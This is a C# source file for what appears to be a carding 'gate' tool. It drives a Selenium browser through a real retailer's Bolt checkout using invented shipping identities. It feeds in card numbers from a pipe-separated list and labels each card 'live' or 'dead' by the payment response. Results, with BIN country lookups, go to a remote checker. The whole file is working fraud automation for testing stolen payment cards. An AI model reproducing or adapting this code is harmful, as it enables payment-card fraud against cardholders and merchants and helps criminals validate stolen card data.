using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Qspray
    {
        check check = new check();
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
           
                driver.Url = "https://www.qspray.com/shop-brands/?sort=priceasc&page=37";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";
                Form1.circularProgressBar1.Value = 5;
                var producto = "//*[@id='product-listing-container']/form/ul/li["+RandomNumber(1,12)+"]/article/figure/a";
                //*[@id="product-listing-container"]/form/ul/li[12]/article/figure/a
                //*[@id="product-listing-container"]/form/ul/li[1]/article/figure/a
                try
                {

        

                if (tiempoElemento(By.XPath(producto)))
                {
                    Form1.circularProgressBar1.Value = 15;
                    driver.FindElement(By.XPath(producto)).Click();
                    Thread.Sleep(500);

                    if (IsElementPresent(By.XPath("/html/body/div[2]/div[1]/div/div[1]/section[3]/div[1]/form[1]/div[1]/div/div/label[1]")))
                    {
                        Form1.circularProgressBar1.Value = 20;
                        driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/div[1]/section[3]/div[1]/form[1]/div[1]/div/div/label[1]")).Click();
                        Thread.Sleep(3000);
                    }

                    driver.ExecuteJavaScript("document.querySelector('#form-action-addToCart').click();");

                    Thread.Sleep(2000);

                    driver.Navigate().GoToUrl("https://www.qspray.com/cart.php");
                    Thread.Sleep(1000);


                    if (tiempoElemento(By.XPath("/html/body/div[2]/div[1]/div/main/div[3]/div[4]/div/div/div[1]/div")))
                    {
                        Form1.circularProgressBar1.Value = 30;
                        driver.FindElement(By.XPath("/html/body/div[2]/div[1]/div/main/div[3]/div[4]/div/div/div[1]/div")).Click();
                        Thread.Sleep(2000);

                        if (tiempoElemento(By.XPath("//*[@id='bolt-checkout-frame']")))
                        {
                            Form1.circularProgressBar1.Value = 40;
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='bolt-checkout-frame']")));
                            Thread.Sleep(2000);

                            if (tiempoElemento(By.XPath("//*[@id='email']")))
                            {
                                Form1.circularProgressBar1.Value = 50;
                                driver.FindElement(By.XPath("//*[@id='email']")).SendKeys(correo);
                                driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/a")).Click();
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='US']")).Click();
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='phone']")).SendKeys("2135248965");
                                driver.FindElement(By.XPath("//*[@id='shippingFirstName']")).SendKeys("Jose");
                                driver.FindElement(By.XPath("//*[@id='shippingLastName']")).SendKeys("Reyes");
                                driver.FindElement(By.XPath("//*[@id='shippingAddressLine1']")).SendKeys("310 310th Street");
                                Thread.Sleep(1000);

                                var country = new SelectElement(driver.FindElement(By.XPath("//*[@id='shippingCountry']")));
                                Thread.Sleep(500);
                                country.SelectByValue("US");
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='shippingZip']")).SendKeys("51247");
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='shippingCity']")).Clear();
                                Thread.Sleep(500);
                                driver.FindElement(By.XPath("//*[@id='shippingCity']")).SendKeys("Rock Valley");
                                var estado = new SelectElement(driver.FindElement(By.XPath("//*[@id='shippingState']")));
                                estado.SelectByText("IA");
                                Thread.Sleep(1000);
                                driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/button")).SendKeys(Keys.Enter);
                                Thread.Sleep(1000);

                                if (IsElementPresent(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/button")))
                                {
                                    driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/button")).Click();
                                    Thread.Sleep(1000);
                                }

                                if (tiempoElemento(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/button")))
                                {
                                    Form1.circularProgressBar1.Value = 60;
                                    driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[2]/button")).Click();
                                    Thread.Sleep(1000);

                                    if (tiempoElemento(By.XPath("//*[@id='ccn']")))
                                    {
                                        Form1.circularProgressBar1.Value = 70;
                                        pago();
                                    }
                                    else
                                    {
                                        restart();
                                    }

                                }
                                else
                                {
                                    restart();
                                }

                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }

                    }
                    else
                    {
                        restart();
                    }

                }
                else
                {
                    restart();
                }

                }
                catch (Exception ex)
                {

                    restart();
                }


            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                 pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {

                
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 5)
                    {
                        Form1.circularProgressBar1.Value = 80;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        driver.FindElement(By.XPath("//*[@id='ccn']")).Click();
                        Thread.Sleep(200);

                        driver.ExecuteJavaScript("document.querySelector('#ccn').value = '';");

                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='ccn']")).Click();
                        Thread.Sleep(1000);

                        for (var i = 0; i <= ccnum.Length - 1; i++)
                        {
                            driver.FindElement(By.XPath("//*[@id='ccn']")).SendKeys(ccnum[i].ToString());
                            Thread.Sleep(300);
                        }
                        Thread.Sleep(500);
                        Thread.Sleep(1000);
                        var ccmes = ccLine[1];
                        driver.ExecuteJavaScript("document.querySelector('#exp').value = '';");
                        Thread.Sleep(1000);
                        for (var i = 0; i <= 1; i++)
                        {
                            driver.FindElement(By.XPath("//*[@id='exp']")).SendKeys(ccmes[i].ToString());
                            Thread.Sleep(300);
                        }
                        Form1.circularProgressBar1.Value = 90;
                        Thread.Sleep(500);
                        var ccanio = ccLine[2].Remove(0, 2);
                        for (var i = 0; i <= 1; i++)
                        {
                            driver.FindElement(By.XPath("//*[@id='exp']")).SendKeys(ccanio[i].ToString());
                            Thread.Sleep(300);
                        }

                        Thread.Sleep(1000);
                        driver.ExecuteJavaScript("document.querySelector('#cvv').value = '';");
                        Thread.Sleep(1000);
                        if (ccLine[3].Trim().Length == 3)
                        {
                            driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("000");
                        }
                        else
                        {
                            driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("0000");
                        }

                        Thread.Sleep(500);

                        if (IsElementPresent(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/button")))
                        {
                            driver.FindElementByXPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/button").Click();
                            Thread.Sleep(1000);
                        }

                        if (IsElementPresent(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[5]/button")))
                        {
                            driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[5]/button")).Click();
                            Thread.Sleep(1000);
                        }

                       

                        Thread.Sleep(2000);


                        if (confirmar())
                        {
                            
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

         public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                    
                    if (IsElementPresent(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[5]/div[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[5]/div[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[5]/div[1]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='checkout-app']/div/div/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='checkout-app']/div/div/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='checkout-app']/div/div/div/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/div[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/div[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div/div/div[3]/div[1]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }
                }
                else
                {
                    estado = "live";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
              


                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

